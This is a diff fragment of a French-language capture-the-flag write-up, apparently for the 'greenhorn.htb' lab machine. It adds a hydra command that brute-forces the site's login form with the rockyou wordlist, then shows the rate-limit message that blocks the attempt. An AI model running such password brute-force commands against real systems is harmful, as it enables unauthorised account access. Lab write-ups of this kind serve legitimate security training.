@@ -56,10 +56,10 @@ On voit que le champ pour le mot de passe se nomme `cont1` et il semble y avoir 
 
 Une fois ces informations en mains, on essaye de cracker le login avec hydra:
 ```bash
-
+hydra -v -V -d -l username -P /home/kali/rockyou.txt -t 16 -m "/login.php:cont1=^PASS^&bogus=&submit=Log+in:F=incorrect" http-post-form://greenhorn.htb 
 ```
 
 Cependant, on se rend vite compte qu'il y a une protection contre le bruteforce
 ```bash
-
+You have exceeded the number of login attempts. Please wait 5 minutes before logging in again.
 ```
